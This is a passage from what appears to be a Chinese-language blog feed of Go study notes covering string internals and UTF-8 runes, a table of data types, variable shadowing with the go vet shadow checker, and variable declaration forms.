class="comment">// rune -&gt; []byte      </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">encodeRune</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> r <span class="keyword">rune</span> = <span class="number">0x4E2D</span></span><br><span class="line">    fmt.Printf(<span class="string">"the unicode charactor is %c\n"</span>, r) <span class="comment">// 中</span></span><br><span class="line">    buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">3</span>)</span><br><span class="line">    _ = utf8.EncodeRune(buf, r) <span class="comment">// 对rune进行utf-8编码</span></span><br><span class="line">    fmt.Printf(<span class="string">"utf-8 representation is 0x%X\n"</span>, buf) <span class="comment">// 0xE4B8AD       </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// []byte -&gt; rune</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decodeRune</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> buf = []<span class="keyword">byte</span>&#123;<span class="number">0xE4</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>&#125;</span><br><span class="line">    r, _ := utf8.DecodeRune(buf) <span class="comment">// 对buf进行utf-8解码</span></span><br><span class="line">    fmt.Printf(<span class="string">"the unicode charactor after decoding [0xE4, 0xB8, 0xAD] is %s\n"</span>, <span class="keyword">string</span>(r)) <span class="comment">// 中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>utf8.EncodeRune</code>：对一个 Unicode字符（rune） 进行 UTF-8 编码</li><li><code>utf8.DecodeRune</code>：UTF-8 解码，将一段内存字节转换成 Unicode 字符</li></ul><p>好了，现在已经搞清楚 Go 语言中字符串类型的性质和组成了。<br>有了这些基础之后，就可以看看 Go 是如何实现字符串类型的。也就是说，在 Go 的编译器和运行时中，一个字符串变量究竟是如何表示的？</p><h2 id="Go-字符串内部表示"><a href="#Go-字符串内部表示" class="headerlink" title="Go 字符串内部表示"></a>Go 字符串内部表示</h2><p>在标准库的 reflect 包中，可以看到对字符串类型的定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $GOROOT/src/reflect/value.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// StringHeader是一个string的运行时表示</span></span><br><span class="line"><span class="keyword">type</span> StringHeader <span class="keyword">struct</span> &#123;</span><br><span class="line">    Data <span class="keyword">uintptr</span>   <span class="comment">// 指向存储字符串数据内容区域的指针值</span></span><br><span class="line">    Len  <span class="keyword">int</span>       <span class="comment">// 是字符串的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>string 类型其实是一个“描述符”，它本身并不真正存储字符串数据，而仅是由一个指向底层存储的指针和字符串的长度字段组成的。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221102191220.png" alt=""></p><p>Go 编译器把源码中的 string 类型映射为运行时的一个二元组（Data, Len），真实的字符串值数据就存储在一个被 Data 指向的底层数组中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dumpBytesArray</span><span class="params">(arr []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"["</span>)</span><br><span class="line">    <span class="keyword">for</span> _, b := <span class="keyword">range</span> arr &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"%c "</span>, b)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"]\n"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">"hello"</span></span><br><span class="line">    hdr := (*reflect.StringHeader)(unsafe.Pointer(&amp;s)) <span class="comment">// 将string类型变量地址显式转型为reflect.StringHeader</span></span><br><span class="line">    fmt.Printf(<span class="string">"0x%x\n"</span>, hdr.Data) <span class="comment">// 0x10a30e0</span></span><br><span class="line">    p := (*[<span class="number">5</span>]<span class="keyword">byte</span>)(unsafe.Pointer(hdr.Data)) <span class="comment">// 获取Data字段所指向的数组的指针</span></span><br><span class="line">    dumpBytesArray((*p)[:]) <span class="comment">// [h e l l o ]   // 输出底层数组的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码利用了 <code>unsafe.Pointer</code> 的通用指针转型能力，按照 StringHeader 给出的结构内存布局，“顺藤摸瓜”，一步步找到了底层数组的地址，并输出了底层数组内容。</p><p>了解了 string 类型的实现原理后，就可以理解为什么获取字符串的长度的时间复杂度是常数。</p><p>以及可以得到这样一个结论：<strong>直接将 string 类型通过函数 / 方法参数传入也不会带来太多的开销。</strong>因为传入的仅仅是一个“描述符”，而不是真正的字符串数据。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>字符串类型作为基本数据类型之一，同样也是日常开发中高频使用的基本数据类型，从原理上看 string 类型，有助于对 Go 语言中的字符串有个完整而清晰的认识。</p><ul><li>字符串底层是一个字节序列，不能按字节去遍历字符串，不能直接通过索引去修改字符串</li><li>string 类型其实是一个描述符，由指向存储字符串数据内容区域的指针值和字符串的长度组成</li><li>for range 迭代 string 采用的是字符视角，得到的结果是 Unicode 字符</li><li>for 迭代 string 采用的是字节视角，得到的结果是 Unicode 字符经过 UTF-8 编码之后在内存中的表示</li><li>Go 使用 rune 类型来表示一个 Unicode 字符的码点</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——数据类型</title>
      <link href="/go-language-study-notes-type-of-data/"/>
      <url>/go-language-study-notes-type-of-data/</url>
      
        <content type="html"><![CDATA[<p>作为一个站在巨人的肩膀上成长起来的现代编程语言，Go 语言中的数据类型大部分都是由C 语言演变而来的，它继承了前辈语言的优点，又改进了前辈语言中的不足，下面来对比看一下。</p><a id="more"></a><h2 id="C-语言数据类型"><a href="#C-语言数据类型" class="headerlink" title="C 语言数据类型"></a>C 语言数据类型</h2><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/C%E8%AF%AD%E8%A8%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.png" alt=""></p><h2 id="Go-语言数据类型"><a href="#Go-语言数据类型" class="headerlink" title="Go 语言数据类型"></a>Go 语言数据类型</h2><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/Go%E8%AF%AD%E8%A8%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.png" alt=""></p><p>可以看到 Go 语言的数据类型更丰富，除了基本的数据类型都支持，像 C 语言中没有的字符串类型，Go 语言也原生支持了。</p><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>认识预定义基本类型、各自占用字节大小以及默认值，有助于开发跨平台应用时无需过多考虑符号和长度差异：</p><table><thead><tr><th>类型</th><th>长度（字节）</th><th>默认值（零值）</th><th>说明</th></tr></thead><tbody><tr><td>bool</td><td>1</td><td>false</td><td></td></tr><tr><td>byte</td><td>1</td><td>0</td><td>uint8</td></tr><tr><td>int, unit</td><td>4,8</td><td>0</td><td>默认整数类型，依据目标平台，32 位或 64 位</td></tr><tr><td>int8, uint8</td><td>1</td><td>0</td><td>-128 ～ 127， 0～255（byte 是uint8 的别名）</td></tr><tr><td>int16, unit16</td><td>2</td><td>0</td><td>-32768<del>32767, 0</del>65535</td></tr><tr><td>int32, unit32</td><td>4</td><td>0</td><td>-21 亿<del>21 亿, 0</del>42 亿（rune 是int32 的别名）</td></tr><tr><td>int64, unit64</td><td>8</td><td>0</td><td></td></tr><tr><td>float32</td><td>4</td><td>0.0</td><td></td></tr><tr><td>float64</td><td>8</td><td>0.0</td><td>默认浮点数类型</td></tr><tr><td>complex64</td><td>8</td><td></td><td></td></tr><tr><td>complex128</td><td>16</td><td></td><td></td></tr><tr><td>rune</td><td>4</td><td>0</td><td>Unicode Code Point, int32</td></tr><tr><td>uintptr</td><td>4,8</td><td>0</td><td>无符号整型，用于存放一个指针</td></tr><tr><td>string</td><td></td><td>“”</td><td>字符串，默认值为 空字符串，而非 NULL</td></tr><tr><td>array</td><td></td><td></td><td>数组</td></tr><tr><td>struct</td><td></td><td></td><td>结构体</td></tr><tr><td>function</td><td></td><td>nil</td><td>函数</td></tr><tr><td>interface</td><td></td><td>nil</td><td>接口</td></tr><tr><td>map</td><td></td><td>nil</td><td>字典，引用类型</td></tr><tr><td>slice</td><td></td><td>nil</td><td>切片，引用类型</td></tr><tr><td>channel</td><td></td><td>nil</td><td>通道，引用类型</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——变量遮蔽问题</title>
      <link href="/go-language-study-notes-variable-shadowing-problem/"/>
      <url>/go-language-study-notes-variable-shadowing-problem/</url>
      
        <content type="html"><![CDATA[<p>变量遮蔽是 Go 开发人员在日常开发工作中最容易犯的编码错误之一，它低级又不容易查找，常常会让你陷入漫长的调试过程。</p><a id="more"></a><h2 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(n <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">x := <span class="number">1</span></span><br><span class="line">x += n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"x = "</span>, x)   <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line">    foo(<span class="number">99</span>)</span><br><span class="line">fmt.Println(<span class="string">"调用函数之后，x 现在的值是："</span>, x)   <span class="comment">// 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次的打印都是 10，包级变量 x 的值，并没有发生变化，这是因为虽然 foo 函数中也使用了变量 x，但是 foo 函数中的变量 x 遮蔽了外面的包级变量 x，这使得包级变量 a 没有参与到 foo 函数的逻辑中，所以就没有发生变化了。</p><p>变量遮蔽只是个引子，想要保证不出现变量遮蔽的问题，需要深入了解代码块和作用域的概念及其背后的规则。</p><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>代码块是什么？<br>Go 语言中的代码块是包裹在一对大括号内部的声明和语句序列，如果一对大括号内部没有任何声明或其他语句，我们就把它叫做空代码块。</p><p>例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">()</span></span> &#123; <span class="comment">// 代码块1</span></span><br><span class="line">    &#123;        <span class="comment">// 代码块2</span></span><br><span class="line">        &#123;    <span class="comment">// 代码块3</span></span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，函数 foo 的函数体是最外层的代码块，这里将它编号为代码块 1。而且，在它的函数体内部，又嵌套了两层代码块，由外向内看分别为代码块 2、代码块 3。</p><p>形如代码块 1 到代码块  3 这样的代码块，它们都是<strong>由两个肉眼可见的且配对的大括号包裹起来的，我们称这样的代码块为显式代码块</strong>（Explicit Blocks）。</p><p>既然有显式代码块的存在，没错，与之对应的就是隐式代码块。<br>隐式代码块没有显式代码块那样的肉眼可见的配对大括号包裹，我们无法通过大括号来识别隐式代码块。</p><p>怎么理解隐式代码块呢？</p><p>来看下面这张图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221101211708.png" alt=""></p><p>它没有明确的实体，只能通过抽象的方式去理解。</p><p>最外面的宇宙代码块、靠里面的包代码块、文件代码块以及if、for、switch 的控制语句，这些都有隐式代码块。</p><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>按照变量的作用域，可以把变量划分为局部变量、包级变量、全局变量。</p><table><thead><tr><th></th><th>局部变量</th><th>包级变量</th><th>全局变量</th></tr></thead><tbody><tr><td>定义</td><td>定义在函数内部的变量、方法接收器变量以及函数的形参都算局部变量</td><td>定义在函数外面的变量称为包级变量</td><td>同样是定义在函数外面的变量，但是首字母大小，那么这个包级变量就会被视为全局变量</td></tr><tr><td>作用域范围</td><td>从定义那一行开始直到与其所在的代码块结束</td><td>当前包文件都可见</td><td>整个 Go 程序都可见</td></tr><tr><td>生命周期</td><td>从程序运行到定义那一行开始分配存储空间直至程序离开该变量所在的作用域</td><td>程序启动时初始化，直至程序结束</td><td>程序启动时初始化，直至程序结束</td></tr></tbody></table><h2 id="避免变量遮蔽的原则"><a href="#避免变量遮蔽的原则" class="headerlink" title="避免变量遮蔽的原则"></a>避免变量遮蔽的原则</h2><p>在了解了 Go 语言的代码块和作用域之后，再来看看前面的那个变量遮蔽问题。</p><p>这一次同时把变量的地址打印出来：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(n <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    x := <span class="number">1</span></span><br><span class="line">    fmt.Println(&amp;x, x)       <span class="comment">// 0xc00001c0a8 1</span></span><br><span class="line"></span><br><span class="line">    x += n</span><br><span class="line">    fmt.Println(&amp;x, x)       <span class="comment">// 0xc00001c0a8 100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"x = "</span>, x)    </span><br><span class="line">    fmt.Println(&amp;x, x)        <span class="comment">// 0x111c368 10</span></span><br><span class="line"></span><br><span class="line">    foo(<span class="number">99</span>)</span><br><span class="line">    fmt.Println(&amp;x, x)        <span class="comment">// 0x111c368 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的输出可以进一步确认，因为作用域的不同，在内存中实际对应两个不同的地址。</p><p>内存分配发生在运行期，编译后的机器码从不使用变量名，而是直接通过内存地址来访问目标数据。<br>尽管变量的名称是相同的，但是内存地址并不相同，所以本质上就不是同一个变量。</p><p>再来看一个例子，加深一下印象：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 包级变量</span></span><br><span class="line"><span class="keyword">var</span> y = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(&amp;y, y)       <span class="comment">// 0x111c370 12</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 局部变量</span></span><br><span class="line">y := <span class="number">24</span></span><br><span class="line">fmt.Println(&amp;y, y)       <span class="comment">// 0xc00001c0d8 24</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量遮蔽问题的根本原因，就是内层代码块中声明了一个与外层代码块同名且同类型的变量，这样就会导致内层代码块中的同名变量就会替代外层变量，参与此层代码块内的相关计算，从而被形象地称之为内层变量遮蔽了外层同名变量。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>可以利用官方提供的 <code>go vet</code> 工具检测变量遮蔽问题，该工具用于对 Go 源码做一系列静态检查。</p><p>在 Go 1.14 版以前默认支持变量遮蔽检查，Go 1.14 版之后，变量遮蔽检查的插件就需要我们单独安装了，安装方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$go</span> install golang.org/x/tools/go/analysis/passes/shadow/cmd/shadow@latest</span><br><span class="line">go: downloading golang.org/x/tools v0.1.5</span><br><span class="line">go: downloading golang.org/x/mod v0.4.2</span><br></pre></td></tr></table></figure><p>Go 默认不做覆盖检查，添加 shadow 选项来启用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ go vet -vettool=$(<span class="built_in">which</span> shadow) -strict complex.go </span><br><span class="line">./complex.go:13:12: declaration of <span class="string">"err"</span> shadows declaration at line 11</span><br></pre></td></tr></table></figure><p>工具确实可以辅助检测，但也不是万能的，所以编码时，需要注意同名变量的声明以及短变量声明的作用域。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——变量声明</title>
      <link href="/go-language-study-notes-variable-declaration/"/>
      <url>/go-language-study-notes-variable-declaration/</url>
      
        <content type="html"><![CDATA[<p>Go 语言崇尚“做一件事只用一种方法”，但变量声明却似乎是一个例外，因为在 Go 语言中，声明一个变量有多种方式。</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在编程语言中，为了方便操作内存特定位置的数据，我们用一个特定的名字与位于特定位置的内存块绑定在一起，这个名字被称为变量。</p><p>但这并不代表我们可以通过变量随意引用或修改内存，<strong>变量所绑定的内存区域是要有一个明确的边界的</strong>。也就是说，通过一个变量，究竟可以操作 4 个字节内存还是 8 个字节内存，编程语言的编译器或解释器需要明确地知道。</p><p>那么，编程语言的编译器或解释器是如何知道一个变量所能引用的内存区域边界呢？</p><p>动态语言的解释器可以在运行时通过对变量赋值的分析，自动确定变量的边界。</p><p>而静态语言就不一样了，编译器没有办法自动确定变量的边界，此时就需要语言的使用者提供，于是就有了“变量声明”。<br>通过变量声明，语言使用者可以显式告知编译器一个变量的边界信息。</p><h2 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h2><p>Go 是静态语言，所有变量在使用前必须先进行声明。声明的意义在于告诉编译器该变量可以操作的内存的边界信息，而这种边界通常又是由变量的类型信息提供的。</p><h3 id="通用声明"><a href="#通用声明" class="headerlink" title="通用声明"></a>通用声明</h3><p>在 Go 语言中，有一个通用的变量声明方法是这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int</span> = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>这个变量声明分为四个部分：</p><ul><li>var 是修饰变量声明的关键字</li><li>a 为变量名</li><li>int 为该变量的类型</li><li>10 是变量的初值</li></ul><p>在 Go 语言中，无论什么类型的变量，都可以使用这种形式进行变量声明，这就是通用的声明方式。</p><p>另外，除了单独声明每个变量外，Go 语言还提供了变量声明块（block）的语法形式，可以用一个 var 关键字将多个变量声明放在一起：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    a, b, c <span class="keyword">int</span> = <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span></span><br><span class="line">    c, d, e <span class="keyword">rune</span> = <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Go 语言还支持在一行变量声明中同时声明多个变量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a, s = <span class="number">1</span>, <span class="string">"ok"</span></span><br></pre></td></tr></table></figure><hr><p>如果没有显式为变量赋予初值，Go 编译器会为变量赋予这个<strong>类型的零值</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int</span> <span class="comment">// a的初值为int类型的零值：0</span></span><br></pre></td></tr></table></figure><p>那什么是类型的零值？<br>Go 语言的每种原生类型都有它的默认值，这个默认值就是零值。</p><p>下面就是 Go 规范定义的内置原生类型的默认值（即零值）</p><table><thead><tr><th>内置原生类型</th><th>默认值（零值）</th></tr></thead><tbody><tr><td>所有整型类型</td><td>0</td></tr><tr><td>浮点类型</td><td>0.0</td></tr><tr><td>布尔类型</td><td>FALSE</td></tr><tr><td>字符串类型</td><td>“”</td></tr><tr><td>指针、接口、切片、channel、map 和函数类型</td><td>nil</td></tr></tbody></table><p>另外，像数组、结构体这样复合类型变量的零值就是它们组成元素都为零值时的结果。</p><p>除了上面这种通用的变量声明形式，Go 语言还提供了两种变量声明的“语法糖”。</p><h3 id="省略类型信息的声明"><a href="#省略类型信息的声明" class="headerlink" title="省略类型信息的声明"></a>省略类型信息的声明</h3><p>这种方式会省略类型信息的声明。</p><p>在通用的变量声明的基础上，Go 编译器允许我们省略变量声明中的类型信息，它的标准范式是<strong>var varName = initExpression</strong>，比如下面就是一个省略了类型信息的变量声明：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = <span class="number">13</span></span><br></pre></td></tr></table></figure><p>使用这种方式声明的前提是，<strong>右侧存在变量初值</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b</span><br></pre></td></tr></table></figure><p>因为没有初始值的声明，编译会报错——“unexpected newline, expecting type”。</p><p>结合多变量声明，可以使用这种变量声明语法糖声明多个不同类型的变量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a, b, c = <span class="number">12</span>, <span class="string">'A'</span>, <span class="string">"hello"</span></span><br></pre></td></tr></table></figure><p>在这种变量声明语法糖中，我们省去了变量类型信息，但 Go 编译器会为我们自动推导出类型信息。</p><h3 id="短变量声明"><a href="#短变量声明" class="headerlink" title="短变量声明"></a>短变量声明</h3><p>使用短变量声明时，我们甚至可以省去 var 关键字以及类型信息，它的标准范式是<strong>varName := initExpression</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a := <span class="number">12</span></span><br><span class="line">b := <span class="string">'A'</span></span><br><span class="line">c := <span class="string">"hello"</span></span><br></pre></td></tr></table></figure><p>短变量声明中的变量类型也是由 Go 编译器自动推导出来的。</p><hr><p>知道了这么多种声明方式，那么在使用时，有没有什么约束呢？<br>这个时候就需要学习点预备知识：Go 语言的两类变量。</p><h2 id="两类变量"><a href="#两类变量" class="headerlink" title="两类变量"></a>两类变量</h2><p>Go 语言的变量按作用域可以分为两类：</p><ul><li>包级变量：也就是在包级别可见的变量。如果是导出变量（大写字母开头），那么这个包级变量也可以被视为全局变量（可以被其他包访问到）</li><li>局部变量：也就是 Go 函数或方法体内声明的变量，仅在函数或方法体内可见</li></ul><h3 id="包级变量的声明形式"><a href="#包级变量的声明形式" class="headerlink" title="包级变量的声明形式"></a>包级变量的声明形式</h3><p>包级变量只能使用带有 var 关键字的变量声明形式，不能使用短变量声明形式，但在形式细节上可以有一定灵活度。</p><h4 id="声明并同时显式初始化"><a href="#声明并同时显式初始化" class="headerlink" title="声明并同时显式初始化"></a>声明并同时显式初始化</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> varName = initExpression</span><br></pre></td></tr></table></figure><p>就像前面说过那样，Go 编译器会自动根据等号右侧 InitExpression 结果值的类型，来确定左侧声明的变量的类型，这个类型会是结果值对应类型的默认类型。</p><p>如果不接受默认类型，而是要显式地为包级变量指定类型，那么有两种方式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一种：</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">13</span> <span class="comment">// 使用默认类型</span></span><br><span class="line"><span class="keyword">var</span> b <span class="keyword">int32</span> = <span class="number">17</span>  <span class="comment">// 显式指定类型</span></span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">float32</span> = <span class="number">3.14</span> <span class="comment">// 显式指定类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种：</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">13</span> <span class="comment">// 使用默认类型</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">int32</span>(<span class="number">17</span>) <span class="comment">// 显式指定类型</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">float32</span>(<span class="number">3.14</span>) <span class="comment">// 显式指定类型</span></span><br></pre></td></tr></table></figure><p>两种方式都可以使用，但从声明一致性的角度出发，Go 更推荐我们使用后者，这样能统一接受默认类型和显式指定类型这两种声明形式。</p><h4 id="声明但延迟初始化"><a href="#声明但延迟初始化" class="headerlink" title="声明但延迟初始化"></a>声明但延迟初始化</h4><p>对于声明时并不立即显式初始化的包级变量，我们可以使用下面这种通用变量声明形式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int32</span>      <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">float64</span>    <span class="comment">// 0.0</span></span><br></pre></td></tr></table></figure><p>虽然这些值没有初始化，但是仍有自己的零值。</p><h3 id="局部变量的声明形式"><a href="#局部变量的声明形式" class="headerlink" title="局部变量的声明形式"></a>局部变量的声明形式</h3><p>短变量声明形式是局部变量最常用的声明形式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a := <span class="number">17</span></span><br><span class="line">f := <span class="number">3.14</span></span><br><span class="line">s := <span class="string">"hello, gopher!"</span></span><br></pre></td></tr></table></figure><p>对于不接受默认类型的变量，依然可以使用短变量声明形式，只是在<code>:=</code>右侧要做一个显式转型，以保持声明的一致性：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a := <span class="keyword">int32</span>(<span class="number">17</span>)</span><br><span class="line">f := <span class="keyword">float32</span>(<span class="number">3.14</span>)</span><br><span class="line">s := []<span class="keyword">byte</span>(<span 